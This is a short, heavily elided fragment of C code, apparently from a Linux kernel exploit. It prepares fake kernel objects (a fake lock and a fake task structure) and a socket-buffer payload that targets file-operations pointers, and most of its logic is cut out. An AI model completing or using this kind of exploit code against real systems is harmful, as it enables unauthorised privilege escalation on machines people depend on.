...
#define DIRECT_WRITE_TIMEOUT_SEC 10
...
static int direct_pselect_write_once_internal(
  ...
  /* Parent does the heavy lifting (page prep, payload) — same pattern
   * as the slide path.  Child only runs the route threads. */
  page_base = 0;
  fake_lock = 0;
  fake_w0 = 0;
  fake_task = 0;
  ...
  if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
    pr_warning("direct-w64[%d] page prep failed\n", idx);
    return 0;
  }
  ...
  if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
    ...
    pr_warning("direct-w64[%d] payload refresh failed\n", idx);
    return 0;
  }
